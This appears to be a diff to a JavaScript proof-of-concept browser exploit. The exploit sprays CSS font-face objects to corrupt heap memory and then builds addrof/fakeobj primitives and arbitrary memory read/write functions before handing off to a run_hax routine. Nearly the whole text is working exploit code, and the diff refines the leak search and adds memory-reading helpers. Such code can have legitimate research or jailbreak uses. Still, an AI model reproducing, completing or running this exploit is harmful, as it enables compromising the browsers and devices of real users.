@@ -3,13 +3,20 @@ var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
 var STRING_OFFSET = 20;
 var SPRAY_FONTS = 0x100a;
-var GUESS_FONT = 8602845184;
+var GUESS_FONT = 0x200430000;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
 var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
 
 function poc() {
+
+function hex(n)
+{
+    if((typeof n) != "number")
+        return ""+n;
+    return "0x" + (new Number(n)).toString(16);
+}
 
     var union = new ArrayBuffer(8);
     var union_b = new Uint8Array(union);
@@ -77,7 +84,7 @@ function poc() {
     window.ffses = {};
 
     do {
-		
+
         var p_s = ptrToString(NPAGES + 2); // vector.size()
         for (var i = 0; i < NPAGES; i++)
             p_s += ptrToString(guf + i * PAGE_SIZE);
@@ -117,6 +124,7 @@ function poc() {
 
     }
     while (guessed_addr === null);
+
     var p_s = '';
     p_s += ptrToString(26);
     p_s += ptrToString(guessed_addr);
@@ -182,9 +190,25 @@ function poc() {
     }
 
     var jsvalue_leak = null;
-	Object.defineProperties({}, props);
-	var index = fastmalloc.search(eval("String.fromCharCode(0x42,0x44,0x43,0x41,0,0,254,255)")+"................"+eval("String.fromCharCode(14)"));
-	jsvalue_leak = stringToPtr(fastmalloc, index + 32);
+
+    while (jsvalue_leak === null) {
+        Object.defineProperties({}, props);
+        for (var i = 0;; i++) {
+            if (fastmalloc.charCodeAt(i) == 0x42 &&
+                fastmalloc.charCodeAt(i + 1) == 0x44 &&
+                fastmalloc.charCodeAt(i + 2) == 0x43 &&
+                fastmalloc.charCodeAt(i + 3) == 0x41 &&
+                fastmalloc.charCodeAt(i + 4) == 0 &&
+                fastmalloc.charCodeAt(i + 5) == 0 &&
+                fastmalloc.charCodeAt(i + 6) == 254 &&
+                fastmalloc.charCodeAt(i + 7) == 255 &&
+                fastmalloc.charCodeAt(i + 24) == 14
+            ) {
+                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
+                break;
+            }
+        }
+    }
 
     var rd_leak = makeReader(jsvalue_leak, 'ffs4');
     var array256 = stringToPtr(rd_leak, 16); //arrays[256]
@@ -302,6 +326,35 @@ function poc() {
         i48_put(p, arw_master);
         arw_master[6] = sz;
     }
+    
+    window.read_mem_s = function(p, sz)
+{
+    read_mem_setup(p, sz);
+    return ""+arw_slave;
+}
+
+window.read_mem_b = function(p, sz)
+{
+    read_mem_setup(p, sz);
+    var b = new Uint8Array(sz);
+    b.set(arw_slave);
+    return b;
+}
+
+window.read_mem_as_string = function(p, sz)
+{
+    var x = read_mem_b(p, sz);
+    var ans = '';
+    for(var i = 0; i < x.length; i++)
+        ans += String.fromCharCode(x[i]);
+    return ans;
+}
+
+window.ref_mem = function(p, sz)
+{
+    read_mem_setup(p, sz);
+    return arw_slave;
+}
 
     window.read_mem = function (p, sz) {
         read_mem_setup(p, sz);
@@ -368,9 +421,12 @@ function poc() {
     var expl_slave = new Uint32Array(2);
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
+    obj.buffer = expl_slave;
+    m[7] = 1;
     obj.buffer = expl_master;
     m[4] = addrof_expl_slave;
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
+    m[7] = 1;
 
     var prim = {
         write8: function (addr, value) {
@@ -439,5 +495,5 @@ function poc() {
         }
     };
     window.p = prim;
-	run_hax();
+    run_hax();
 }
